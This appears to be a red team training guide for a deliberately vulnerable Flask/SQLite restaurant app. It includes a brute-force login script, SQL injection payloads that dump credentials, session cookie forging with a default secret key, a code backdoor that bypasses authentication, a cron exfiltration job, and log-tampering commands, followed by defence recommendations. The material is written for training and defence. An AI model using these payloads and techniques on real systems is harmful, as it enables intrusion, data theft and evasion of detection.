# Red Team Attack Scenarios - Restaurant Management System

## Overview

This document outlines realistic red team attack vectors against the Restaurant Management System, including reconnaissance, exploitation, and post-exploitation techniques. This is for **authorized security training only**.

---

## Red Team Objectives

### Primary Goals
1. ✅ Gain unauthorized access to user accounts
2. ✅ Extract sensitive data (orders, user info)
3. ✅ Compromise admin account for system control
4. ✅ Modify or delete critical data
5. ✅ Establish persistence for long-term access
6. ✅ Evade detection and logging

### Secondary Goals
1. ✅ Escalate privileges
2. ✅ Access underlying system
3. ✅ Establish backdoor access
4. ✅ Harvest credentials
5. ✅ Pivot to other systems

---

## Attack Chain Overview

```
┌─────────────────────────────────────────────────────────────┐
│                   RECONNAISSANCE                            │
│  • Gather application info                                  │
│  • Identify vulnerabilities                                 │
│  • Map network/system                                       │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│                   EXPLOITATION                              │
│  • SQL Injection                                            │
│  • Brute Force                                              │
│  • Default Credentials                                      │
│  • Input Validation Bypass                                 │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│              POST-EXPLOITATION                              │
│  • Data Exfiltration                                        │
│  • Privilege Escalation                                     │
│  • Persistence                                              │
│  • Lateral Movement                                         │
└──────────────────────┬──────────────────────────────────────┘
                       │
┌──────────────────────▼──────────────────────────────────────┐
│                   EVASION                                   │
│  • Log manipulation                                         │
│  • Detection evasion                                        │
│  • Cover tracks                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Phase 1: Reconnaissance

### 1.1 Passive Information Gathering

**Techniques:**
- Browse public website without logging in
- Analyze HTTP responses for version info
- Check page source for comments/hints
- Identify technology stack

**What a Red Team Finds:**
```
GET http://localhost:5000/
reveals:
- Flask framework
- Python application
- Likely vulnerable patterns
- Error messages (if debugging enabled)
```

**Information Available:**
- Application structure (routes visible in templates)
- Technology stack (Flask, SQLite, etc.)
- Naming conventions (admin_dashboard endpoint exists)
- Possible authenticated endpoints

---

### 1.2 Active Reconnaissance

**Techniques:**
- Port scanning
- Service enumeration
- Directory fuzzing
- Endpoint discovery

**Endpoints Discovered:**
```
/                    → Home
/menu                → Menu (public)
/register            → User registration
/login               → Authentication
/logout              → Logout
/order               → Order placement
/my-orders           → Order viewing
/admin               → Admin area (likely restricted)
/admin/orders        → Admin orders
/admin/logs          → Security logs
/lab/billing         → Lab endpoint (INTERESTING!)
/admin/exploiters    → Exploiter tracking
```

**Findings:**
- ✅ /lab/billing endpoint discovered (suspicious, unusual for restaurant app)
- ✅ Multiple admin endpoints suggest admin functionality
- ✅ Security logging system evident (admin/logs)

---

### 1.3 Technology Fingerprinting

**Discover:**
- Flask web framework
- SQLite database backend
- Python runtime
- No HTTPS initially (if running locally)
- Session cookies (Flask session format)

**Potential Weaknesses:**
- SQLite is single-file database (backup might be accessible)
- Python code might be decompilable
- Session cookies might be predictable
- Default Flask secret key (mentioned in code)

---

## Phase 2: Exploitation

### Attack 2.1: Brute Force Authentication

**Target:** `/login` endpoint

**Method:**
```python
import requests

users = ['admin', 'user', 'test', 'root']
passwords = ['123456', 'password', 'admin123', 'test', 'changeme']

for username in users:
    for password in passwords:
        data = {'username': username, 'password': password}
        r = requests.post('http://localhost:5000/login', data=data)
        if 'Dashboard' in r.text or 'menu' in r.text:
            print(f"✅ Found: {username}:{password}")
```

**Vulnerability:**
- No rate limiting on login attempts
- No account lockout after failed attempts
- No CAPTCHA protection
- Weak default password (admin123)

**Blue Team Detection:**
```
Alert: FAILED_LOGIN | IP: [attacker] | Multiple failed attempts
Alert: FAILED_LOGIN | IP: [attacker] | Same IP, 50+ attempts in 1 minute
```

**Red Team Mitigation:**
- Use proxies to spread IP addresses
- Space out attempts over time
- Target multiple accounts simultaneously

---

### Attack 2.2: SQL Injection via Lab Endpoint

**Target:** `/lab/billing` endpoint (when LAB_MODE enabled)

**Method:**
```
Payload 1: ' OR '1'='1' --
Result: Extract all coupons

Payload 2: ' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master --
Result: Enumerate all tables

Payload 3: ' UNION SELECT username,password,3,4,5,6,7 FROM users --
Result: Extract user credentials
```

**Full Attack:**
```sql
-- Step 1: Find users table
' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' --
-- Result: users, orders, secret_coupons

-- Step 2: Get user credentials
' UNION SELECT username,password,3,4,5,6,7 FROM users --
-- Result: admin | [hashed_password]

-- Step 3: Compromise accounts
[Extract hashed passwords and crack offline]
```

**Blue Team Detection:**
```
Alert: LAB_BILLING_ATTEMPT | Payload: ' UNION...
Alert: SQLI_EXPLOITER | User: [username] claimed trap coupon
Alert: LAB_BILLING_ERROR | SQL syntax error from [IP]
```

**Red Team Advantage:**
- Lab mode provides playground for exploitation discovery
- Can practice payloads without immediate detection
- Once credentials extracted, can bypass lab entirely

---

### Attack 2.3: Weak Session Management

**Target:** Session cookies

**Method:**
```python
# Analyze session cookie structure
GET /menu
Response: Set-Cookie: session=...

# Flask session cookies are predictable if secret_key is weak
# Check app.py: app.secret_key = 'your-secret-key-change-in-production'

# If default secret used, can forge session cookies
import itsdangerous
s = itsdangerous.URLSafeTimedSerializer('your-secret-key-change-in-production')
forged_session = s.dumps({'username': 'admin', 'role': 'admin'})
```

**Attack:**
- Forge admin session cookie
- Set in browser cookies
- Access `/admin` without password

**Blue Team Detection:**
- Session validation on each request
- Timestamp verification in session
- IP address verification (optional)

---

### Attack 2.4: Default Credentials

**Target:** Admin account

**Method:**
```
Username: admin
Password: admin123
```

**Code gives this away:**
```python
# In app.py init_db():
admin_password = generate_password_hash('admin123')
cursor.execute(
    "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
    ('admin', admin_password, 'admin')
)
```

**Attack Flow:**
1. Application tells you default credentials in comments
2. Try: admin / admin123
3. Success → Admin access
4. Access all admin features
5. View security logs of all attacks
6. Extract all data

**Real World Scenario:**
Many systems ship with default credentials that are never changed in production.

---

### Attack 2.5: Direct Database Access

**Target:** SQLite database file

**Method:**
```bash
# If you can access the filesystem:
cp restaurant.db ./

# Then extract everything locally:
sqlite3 restaurant.db
SELECT * FROM users;
SELECT * FROM orders;
SELECT * FROM secret_coupons;
```

**How Red Team Gets Access:**
- Server misconfiguration (database accessible via web)
- Backup files in public directories
- Database copy left in temp directory
- Weak file permissions

**Blue Team Protection:**
- Database file outside web root
- Restrictive file permissions (600)
- Regular backups with encryption
- File integrity monitoring

---

## Phase 3: Post-Exploitation

### 3.1 Data Exfiltration

**Available Data to Steal:**
```
Users Table:
- Username (all users)
- Password hash (crackable)
- Role (admin users)
- Timestamps (user activity)

Orders Table:
- Username (links to users)
- Items ordered (food preferences)
- Quantity and status
- Timestamps (activity patterns)

Secret Coupons Table:
- Coupon codes
- Discount percentages
- Is_trap flag
- Who claimed them
```

**Exfiltration Methods:**
```bash
# Method 1: Export via SQL
sqlite3 restaurant.db "SELECT * FROM users;" > /tmp/users.txt
sqlite3 restaurant.db "SELECT * FROM orders;" > /tmp/orders.txt

# Method 2: Copy database file
cp restaurant.db /tmp/

# Method 3: Query via application
Use admin dashboard to view all logs and data

# Method 4: Side channel (time-based inference)
Use timing measurements to extract data bit-by-bit
```

**Red Team Goal:**
- Extract all user credentials
- Extract all orders (customer data)
- Extract coupon codes
- Sell or use data for fraud

---

### 3.2 Privilege Escalation

**Current Situation:**
- Regular user account compromised
- Admin account available

**Escalation Path:**
```
1. Compromise regular user account
   ↓
2. Extract credentials via SQL injection
   ↓
3. Compromise admin account
   ↓
4. Access /admin endpoints
   ↓
5. View all system data and logs
   ↓
6. Full system control
```

**Admin-Only Features Accessible:**
- View all orders (`/admin/orders`)
- Modify order status (`/admin/update-order`)
- View security logs (`/admin/logs`)
- View who exploited the system (`/admin/exploiters`)

---

### 3.3 Persistence Mechanisms

**Goal:** Maintain access after initial compromise

**Method 1: Create Backdoor Admin Account**
```python
# Via SQL injection or direct DB access:
INSERT INTO users (username, password, role) VALUES (
    'backdoor',
    '[hashed_password]',
    'admin'
);
```

**Method 2: Modify Code**
```python
# Add authentication bypass in app.py:
@app.before_request
def backdoor():
    if request.remote_addr == '[RED_TEAM_IP]':
        session['username'] = 'admin'
        session['role'] = 'admin'
```

**Method 3: Plant Webshell**
```python
# Add file upload vulnerability
# Create upload endpoint that accepts files
# Upload Python shell script
# Execute commands on system
```

**Method 4: Scheduled Tasks**
```bash
# Add cron job to exfiltrate data regularly:
0 2 * * * /usr/bin/python3 /tmp/exfil.py
```

---

## Phase 4: Evasion & Counter-Detection

### 4.1 Log Evasion

**Challenge:** Blue team is logging everything

**Evasion Techniques:**

**Technique 1: Exploit the Trap**
```
Red Team doesn't care about trap detection
They're willing to trigger it
Alert: SQLI_EXPLOITER | IP: [attacker_IP]
But they've already exfiltrated all data
By time log is reviewed, damage done
```

**Technique 2: Log Flooding**
```python
# Generate thousands of legitimate-looking entries
for i in range(10000):
    requests.get('http://localhost:5000/menu')
# Real malicious activity buried in noise
```

**Technique 3: Direct Log Modification**
```bash
# If you have server access:
rm logs/security_alerts.log
# Or modify specific entries:
sed -i '/SQLI_EXPLOITER/d' logs/security_alerts.log
```

**Technique 4: Slow Attacks**
```python
# One request every 5 minutes
# Spread over weeks
# Might not trigger alerts due to inactivity
# Less likely to be noticed
import time
time.sleep(300)  # Wait 5 minutes
```

### 4.2 Detection Evasion

**What Gets Logged:**
- IP addresses
- Usernames
- Actions taken
- Timestamps
- SQL injection attempts
- Failed logins

**Evasion Methods:**

**Method 1: Use Proxies/VPN**
```
Direct IP: [Red Team IP]
Via Proxy: [Proxy IP] → [Red Team IP hidden]
Blue team logs see proxy, not actual attacker
```

**Method 2: Impersonate Legitimate User**
```
Compromise regular user account
Use legitimate credentials
All activity appears as regular user
Harder to detect anomalies
```

**Method 3: Use Scheduled/Batch Attacks**
```
Attack during high-traffic times
Low requests per second (blend in)
Use legitimate-looking patterns
```

**Method 4: Exploit Internal Network**
```
If on internal LAN:
No external IP to filter
Blend with legitimate internal traffic
Harder to distinguish from normal use
```

---

## Phase 5: Complete Attack Scenario

### Scenario: Ransomware Deployment

**Timeline:**
```
Day 1: Reconnaissance
├─ Discover endpoints
├─ Identify SQL injection vulnerability
└─ Find default admin credentials

Day 2: Initial Exploitation
├─ Brute force or use default admin/admin123
├─ Access admin dashboard
└─ Extract all data for ransom threat

Day 3: Privilege Escalation
├─ SQL injection to extract all passwords
├─ Compromise multiple accounts
└─ Create backdoor admin account

Day 4: Establish Persistence
├─ Modify code to add authentication bypass
├─ Create scheduled data exfiltration
└─ Deploy web shell

Day 5: Deploy Ransomware
├─ Upload ransomware via file upload
├─ Execute via web shell
├─ Encrypt database
├─ Modify application files
└─ Display ransom message

Day 6: Demand Payment
├─ Contact owner
├─ Show proof: Stolen data
├─ Demand payment in crypto
├─ Deadline for decryption
```

**Impact:**
- ❌ All customer data stolen
- ❌ System completely encrypted
- ❌ Restaurant operations halted
- ❌ Financial loss
- ❌ Reputation damage
- ❌ Regulatory fines

---

## Red Team Advantages

### What Works Against Blue Team

1. **Lab Mode is a Gift**
   - Intentional vulnerability
   - Can practice payloads safely
   - Understanding gained freely

2. **Default Credentials Visible**
   - Code comments reveal defaults
   - admin/admin123 widely known
   - Immediate admin access possible

3. **Minimal Rate Limiting**
   - Can brute force accounts
   - No IP blocking
   - Unlimited login attempts

4. **Database is SQLite**
   - Single file on disk
   - Easy to copy if accessible
   - No special hardware required

5. **Weak Session Security**
   - Predictable session format
   - Known secret key
   - Can forge sessions

6. **Comprehensive Logging**
   - Ironic: Shows them exactly what they did
   - But they've already exploited
   - Too late to prevent

---

## Blue Team Defenses Currently In Place

### What Protects Against Attacks

1. **Input Validation**
   - Blocks suspicious patterns
   - Parameterized queries (except lab)
   - Rate limiting on some endpoints

2. **Logging System**
   - Tracks all activities
   - Records IP addresses
   - Timestamps everything
   - Alerts on suspicious activity

3. **Trap Detection**
   - Hidden coupon triggers alert
   - Automatically flags exploiters
   - Records database modifications

4. **Separate Production Environment**
   - All production routes secure
   - Parameterized queries everywhere
   - No direct SQL injection there

5. **Admin Dashboard**
   - Visibility into security logs
   - Can see who exploited system
   - Can track suspicious users

---

## Red Team's Counter Measures

### Defeating Blue Team Defenses

| Blue Team Defense | Red Team Counter |
|---|---|
| Input Validation | Use encoding/obfuscation |
| Rate Limiting | Distribute across multiple IPs |
| Logging | Log flooding or direct modification |
| Trap Detection | Trigger trap intentionally (data already stolen) |
| Authentication | SQL injection or default credentials |
| Session Security | Forge sessions with known secret |
| Monitoring | Use slow attacks over time |

---

## Critical Vulnerabilities Red Team Can Exploit

### Ranked by Severity

**CRITICAL:**
1. Default admin credentials (admin/admin123)
2. SQL injection in lab endpoint (when LAB_MODE=True)
3. No account lockout on failed logins

**HIGH:**
4. Predictable session format
5. Direct filesystem access possible
6. No encryption of sensitive data
7. Weak session secret key

**MEDIUM:**
8. Information disclosure in responses
9. No HTTPS (in default config)
10. Detailed error messages

---

## How Red Team Prioritizes Targets

### Escalation of Compromise

```
Level 1: Initial Access (Easy)
├─ Use default credentials: admin/admin123
├─ Or brute force: 100 attempts
├─ Time to access: < 5 minutes
└─ Risk level: LOW

Level 2: User Data Extraction (Medium)
├─ SQL injection to get users table
├─ Extract password hashes
├─ Offline cracking
└─ Time to access: 30 minutes
└─ Risk level: MEDIUM

Level 3: Full Data Exfiltration (High)
├─ Get all orders
├─ Get all user info
├─ Get secret coupons
├─ Customer data worth $$
└─ Time to access: 1 hour
└─ Risk level: HIGH

Level 4: Persistence & Backdoors (Critical)
├─ Modify database
├─ Add backdoor accounts
├─ Modify code
├─ Establish long-term access
└─ Time to setup: 2 hours
└─ Risk level: CRITICAL
```

---

## Red Team Timeline to Full Compromise

```
T+0:   Discover endpoints
T+5:   Identify SQL injection / default credentials
T+10:  Gain admin access
T+15:  Extract user database
T+20:  Extract order data
T+25:  Create backdoor account
T+30:  Deploy persistence mechanism
T+45:  Complete data exfiltration
T+60:  Ready for ransomware or data sale
```

**Timeline: 1 hour from discovery to full system compromise**

---

## Red Team Success Indicators

### How They Know They've Succeeded

```
✅ Can login as admin
✅ Can view all user data
✅ Can view all orders
✅ Can modify order status
✅ Can read security logs
✅ Can access /admin/exploiters
✅ Database extracted to attacker system
✅ Backdoor account created
✅ Persistence established
✅ Encryption deployed (ransomware)
```

---

## Defense Recommendations

To defend against red team attacks:

### Immediate Actions
1. ❌ **Disable LAB_MODE** (before any attack)
2. ❌ **Change default credentials** (admin/admin123 → strong password)
3. ✅ **Implement rate limiting** (max 5 login attempts per IP per minute)
4. ✅ **Add account lockout** (lock after 10 failed attempts)
5. ✅ **Implement HTTPS** (encrypt all communications)

### Short-term Actions
6. ✅ **Rotate session secret key** (use random 32-char string)
7. ✅ **Add input validation** (whitelist acceptable patterns)
8. ✅ **Implement Web Application Firewall** (WAF)
9. ✅ **Enable intrusion detection** (IDS)
10. ✅ **Setup log monitoring** (real-time alerts)

### Long-term Actions
11. ✅ **Implement multi-factor authentication** (MFA)
12. ✅ **Database encryption at rest**
13. ✅ **Regular security audits** (penetration testing)
14. ✅ **Security training** (developers & users)
15. ✅ **Zero-trust architecture** (verify everything)

---

## Conclusion

**Red team attack paths:**
- ✅ Easy initial compromise via default credentials
- ✅ Quick SQL injection exploitation in lab mode
- ✅ Rapid privilege escalation to admin
- ✅ Full data exfiltration within 1 hour
- ✅ Long-term persistence via backdoors
- ✅ Detection evasion through various methods

**Key takeaway:**
The system has defensive mechanisms (logging, input validation), but red team can still compromise quickly if:
1. LAB_MODE is enabled
2. Default credentials not changed
3. No rate limiting
4. No account lockout
5. No real-time monitoring

**Blue team must:**
- Eliminate known vulnerabilities
- Implement defense in depth
- Monitor for suspicious activity
- Respond quickly to alerts
- Reduce attack surface

This demonstrates why **security fundamentals matter**: default credentials, rate limiting, encryption, and monitoring are existential defenses against determined attackers.
